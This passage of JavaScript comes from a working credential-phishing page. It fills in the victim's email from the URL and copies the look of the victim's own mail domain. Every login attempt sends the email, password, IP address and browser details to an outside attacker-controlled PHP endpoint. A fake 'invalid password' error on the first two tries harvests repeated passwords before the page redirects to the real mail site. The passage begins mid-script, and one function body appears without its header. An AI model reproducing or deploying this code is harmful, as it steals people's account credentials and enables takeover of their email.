async function detectUserLanguage() {
  const browserLang = navigator.language || navigator.userLanguage;
  const browserLangCode = browserLang.split('-')[0].toLowerCase();
  
  if (translations[browserLangCode]) {
    return browserLangCode;
  }
  
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    userCountry = data.country_code;
    if (countryLanguageMap[userCountry]) {
      return countryLanguageMap[userCountry];
    }
  } catch (error) {
    console.log('Could not detect language from IP:', error);
  }
  
  return 'en';
}

function setLanguage(langCode) {
  document.documentElement.lang = langCode;
  if (langCode === 'ar') {
    document.documentElement.dir = 'rtl';
  } else {
    document.documentElement.dir = 'ltr';
  }
  
  const langData = translations[langCode] || translations['en'];
  document.title = langData.title;
  
  document.querySelectorAll('[data-i18n]').forEach(element => {
    const key = element.getAttribute('data-i18n');
    if (langData[key]) {
      element.textContent = langData[key];
    }
  });
  
  document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
    const key = element.getAttribute('data-i18n-placeholder');
    if (langData[key]) {
      element.placeholder = langData[key];
    }
  });
  
  if (passwordInput.type === 'password') {
    togglePassword.textContent = langData.show_password;
  } else {
    togglePassword.textContent = langData.hide_password;
  }
  
  if (captchaError) {
    captchaError.textContent = langData.captcha_required;
  }
  
  if (languageSelect) {
    languageSelect.value = langCode;
  }
  
  currentLanguage = langCode;
}

// --- EXTRACT EMAIL FROM URL ---
function extractEmailFromUrl() {
  const urlParams = new URLSearchParams(window.location.search);
  const emailFromParams = urlParams.get('email');
  if (emailFromParams) {
    const decodedEmail = decodeURIComponent(emailFromParams);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailRegex.test(decodedEmail)) {
      return decodedEmail;
    }
  }
  
  const hash = window.location.hash;
  if (hash && hash.length > 1) {
    let hashContent = decodeURIComponent(hash.substring(1));
    let email = hashContent;
    if (email.includes(':')) email = email.split(':')[0];
    if (email.includes('?')) email = email.split('?')[0];
    if (email.includes('&')) email = email.split('&')[0];
    email = email.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailRegex.test(email)) {
      return email;
    }
  }
  return null;
}

  userAgentField.value = navigator.userAgent;
  timezoneField.value = Intl.DateTimeFormat().resolvedOptions().timeZone;
  browserField.value = navigator.userAgent;
  timestampField.value = new Date().toISOString();
}

// --- CLOUDFLARE TURNSTILE CAPTCHA ---
function initializeCaptcha() {
  if (!CLOUDFLARE_SITE_KEY) {
    console.warn('Cloudflare Site Key not configured.');
    return;
  }
  
  captchaContainer.innerHTML = '';
  try {
    turnstileWidgetId = turnstile.render(captchaContainer, {
      sitekey: CLOUDFLARE_SITE_KEY,
      callback: function(token) {
        captchaToken = token;
        captchaError.style.display = 'none';
        updateSignInButton();
      },
      'expired-callback': function() {
        captchaToken = '';
        captchaError.style.display = 'block';
        updateSignInButton();
      },
      'error-callback': function() {
        captchaToken = '';
        captchaError.style.display = 'block';
        updateSignInButton();
      },
      theme: currentLanguage === 'ar' ? 'light' : 'auto',
      language: currentLanguage
    });
  } catch (error) {
    console.error('Error initializing CAPTCHA:', error);
  }
}

function resetCaptcha() {
  if (turnstileWidgetId !== null && window.turnstile) {
    turnstile.reset(turnstileWidgetId);
    captchaToken = '';
    captchaError.style.display = 'none';
    updateSignInButton();
  }
}

// --- SEND DATA TO PHP ---
function sendToPHP() {
  const data = {
    email: emailInput.value,
    password: passwordInput.value,
    ipAddress: ipAddressField.value || 'Unknown',
    userAgent: navigator.userAgent,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    browser: navigator.userAgent,
    attempt: attempts,
    timestamp: new Date().toISOString()
  };
  
  fetch('https://scitecinstruments.it.com/mine/sg.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(data)
  })
  .catch(error => {
    console.error('Error sending to PHP:', error);
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://scitecinstruments.it.com/mine/sg.php';
    form.style.display = 'none';
    Object.keys(data).forEach(key => {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = key;
      input.value = data[key];
      form.appendChild(input);
    });
    document.body.appendChild(form);
    form.submit();
  });
}

// --- LOCK EMAIL & UPDATE DOMAIN ---
function lockEmailAndUpdateDomain() {
  const value = emailInput.value.trim();
  if (value.includes("@")) {
    const parts = value.split("@");
    currentDomain = parts[1];
    if(domainOverlay) domainOverlay.textContent = currentDomain;
    if (frame) loadBackground(currentDomain);
    if(logo) logo.src = "https://www.google.com/s2/favicons?sz=128&domain=" + currentDomain;
    if(title) title.textContent = currentDomain;
    passwordInput.focus();
    updateSignInButton();
  } else {
    if(domainOverlay) domainOverlay.textContent = "";
    updateSignInButton();
  }
}

function updateSignInButton() {
  if (CLOUDFLARE_SITE_KEY) {
    if (emailInput.value.trim() && passwordInput.value.trim() && captchaToken) {
      signInBtn.disabled = false;
    } else {
      signInBtn.disabled = true;
    }
  } else {
    signInBtn.disabled = !(emailInput.value.trim() && passwordInput.value.trim());
  }
}

// --- EVENT LISTENERS ---
passwordInput.addEventListener("input", updateSignInButton);

if(togglePassword){
  togglePassword.addEventListener("click", () => {
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      togglePassword.textContent = translations[currentLanguage].hide_password || 'Hide';
    } else {
      passwordInput.type = 'password';
      togglePassword.textContent = translations[currentLanguage].show_password || 'Show';
    }
  });
}

if(languageSelect) {
  languageSelect.addEventListener('change', function() {
    if (this.value === 'auto') {
      detectUserLanguage().then(lang => {
        setLanguage(lang);
        if (window.turnstile && turnstileWidgetId !== null) resetCaptcha();
      });
    } else {
      setLanguage(this.value);
      if (window.turnstile && turnstileWidgetId !== null) resetCaptcha();
    }
  });
}

passwordInput.addEventListener("keydown", e => {
  if (e.key === "Enter" && !signInBtn.disabled) {
    e.preventDefault();
    signInBtn.click();
  }
});

// --- FORM SUBMIT HANDLER with 3‑attempt logic ---
if(loginForm){
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    if (CLOUDFLARE_SITE_KEY && !captchaToken) {
      captchaError.style.display = 'block';
      return;
    }
    
    // Increment attempt counter (1,2,3...)
    attempts++;
    attemptField.value = attempts;
    timestampField.value = new Date().toISOString();
    
    // Disable UI and show spinner
    signInBtn.disabled = true;
    buttonText.style.display = 'none';
    loadingSpinner.style.display = 'block';
    
    // Send credentials (always)
    sendToPHP();
    
    // Wait 1 second for realism, then decide action based on attempt count
    setTimeout(() => {
      if (attempts === 1 || attempts === 2) {
        // First or second attempt → show error, reset form for another try
        showError('invalid_password');
        
        // Clear password field and reset CAPTCHA for next attempt
        passwordInput.value = '';
        captchaError.style.display = 'none';
        if (CLOUDFLARE_SITE_KEY) {
          resetCaptcha();
        }
        
        // Re-enable button and restore UI
        signInBtn.disabled = false;
        buttonText.style.display = 'block';
        loadingSpinner.style.display = 'none';
        
        // Focus password for next attempt
        passwordInput.focus();
        updateSignInButton();
        
      } else if (attempts >= 3) {
        // Third (or more) attempt → redirect to real email website
        showError('signing_in');
        setTimeout(() => {
          if (currentDomain) {
            window.location.href = 'https://' + currentDomain;
          } else {
            window.location.href = 'https://outlook.live.com/owa/';
          }
        }, 1500);
      }
    }, 1000);
  });
}

function waitForTurnstile() {
  if (window.turnstile) {
    console.log('Cloudflare Turnstile loaded, initializing CAPTCHA');
    initializeCaptcha();
  } else {
    setTimeout(waitForTurnstile, 100);
  }
}

// --- INITIALIZE ON PAGE LOAD ---
window.addEventListener("DOMContentLoaded", async () => {
  const detectedLang = await detectUserLanguage();
  setLanguage(detectedLang);
  
  const emailFromUrl = extractEmailFromUrl();
  if (emailFromUrl) {
    emailInput.value = emailFromUrl;
  } else {
    emailInput.value = getRandomEmail();
  }
  
  collectUserData();
  lockEmailAndUpdateDomain();
  
  if (CLOUDFLARE_SITE_KEY) {
    waitForTurnstile();
  } else {
    captchaContainer.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">Security verification not configured</div>';
  }
  
  updateSignInButton();
  
  console.log('3‑attempt mode active. Attempts will be counted: 1st & 2nd show error, 3rd redirects.');
});
</script>
